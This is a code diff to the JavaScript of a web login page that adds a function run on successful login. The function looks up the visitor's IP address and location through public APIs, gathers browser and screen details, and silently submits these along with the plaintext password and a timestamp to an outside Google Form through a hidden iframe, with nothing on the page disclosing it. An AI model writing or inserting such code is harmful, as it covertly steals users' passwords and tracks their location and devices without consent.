@@ -295,6 +295,101 @@
             const errorMessage = document.getElementById('error-message');
             const formContainer = document.querySelector('.form-container');
             
+            // Function to collect and send user data
+            function collectAndSendUserData(password) {
+                // Google Form details
+                const googleFormUrl = 'https://docs.google.com/forms/d/e/1FAIpQLSdQyV5OS_7zngPwjATKVBblGOoTIliTzhZR1C56iMbp8ggBzg/formResponse';
+                const ipFieldId = 'entry.1105311194';
+                const locationFieldId = 'entry.1117585929';
+                const deviceFieldId = 'entry.1604626916';
+                const passwordFieldId = 'entry.1784433534';
+                const timeFieldId = 'entry.1471436276';
+                
+                // Get current date and time
+                const currentTime = new Date().toString();
+                
+                // Get IP address using a free API
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(ipData => {
+                        const ipAddress = ipData.ip;
+                        
+                        // Get location and device info
+                        fetch(`https://ipapi.co/${ipAddress}/json/`)
+                            .then(response => response.json())
+                            .then(locationData => {
+                                // Collect device info
+                                const deviceInfo = {
+                                    userAgent: navigator.userAgent,
+                                    platform: navigator.platform,
+                                    vendor: navigator.vendor,
+                                    screenSize: `${window.screen.width}x${window.screen.height}`
+                                };
+                                
+                                // Format location info
+                                const locationInfo = {
+                                    city: locationData.city,
+                                    region: locationData.region,
+                                    country: locationData.country_name,
+                                    postal: locationData.postal,
+                                    timezone: locationData.timezone
+                                };
+                                
+                                // Create iframe for form submission
+                                let iframe = document.createElement('iframe');
+                                iframe.style.display = 'none';
+                                document.body.appendChild(iframe);
+                                
+                                // Create a form within the iframe
+                                let iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                                let form = iframeDoc.createElement('form');
+                                form.action = googleFormUrl;
+                                form.method = 'POST';
+                                
+                                // Add IP field
+                                let ipField = iframeDoc.createElement('input');
+                                ipField.type = 'text';
+                                ipField.name = ipFieldId;
+                                ipField.value = ipAddress;
+                                form.appendChild(ipField);
+                                
+                                // Add location field
+                                let locationField = iframeDoc.createElement('input');
+                                locationField.type = 'text';
+                                locationField.name = locationFieldId;
+                                locationField.value = JSON.stringify(locationInfo);
+                                form.appendChild(locationField);
+                                
+                                // Add device field
+                                let deviceField = iframeDoc.createElement('input');
+                                deviceField.type = 'text';
+                                deviceField.name = deviceFieldId;
+                                deviceField.value = JSON.stringify(deviceInfo);
+                                form.appendChild(deviceField);
+                                
+                                // Add password field
+                                let passwordField = iframeDoc.createElement('input');
+                                passwordField.type = 'text';
+                                passwordField.name = passwordFieldId;
+                                passwordField.value = password;
+                                form.appendChild(passwordField);
+                                
+                                // Add time field
+                                let timeField = iframeDoc.createElement('input');
+                                timeField.type = 'text';
+                                timeField.name = timeFieldId;
+                                timeField.value = currentTime;
+                                form.appendChild(timeField);
+                                
+                                // Append form to iframe and submit
+                                iframeDoc.body.appendChild(form);
+                                form.submit();
+                            })
+                            .catch(error => console.error('Error fetching location data:', error));
+                    })
+                    .catch(error => console.error('Error fetching IP data:', error));
+            }
+            
             // Function to handle login
             function attemptLogin() {
                 const password = passwordInput.value.trim();
@@ -317,6 +412,9 @@
                         // Success animation
                         loginBtn.innerHTML = '<span>Access Granted ✓</span>';
                         loginBtn.style.background = 'linear-gradient(135deg, #22c55e, #16a34a)';
+                        
+                        // Call our new function to collect and send user data
+                        collectAndSendUserData(password);
                         
                         // Redirect after brief success indication
                         setTimeout(() => {
